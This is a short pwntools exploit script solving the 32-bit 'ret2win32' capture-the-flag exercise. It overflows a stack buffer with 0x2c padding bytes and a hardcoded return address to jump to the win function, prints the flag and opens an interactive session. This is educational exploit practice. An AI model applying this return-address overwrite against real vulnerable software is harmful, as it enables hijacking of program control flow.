#/usr/bin/env python

from pwn import *

context.binary = './ret2win32'
context.log_level = 'debug'

io = process('./ret2win32')

io.recv()
payload = 'A'*0x2c+p32(0x8048659)

io.sendline(payload)
flag = io.recvline()
log.info('flag:'+flag)

io.interactive()
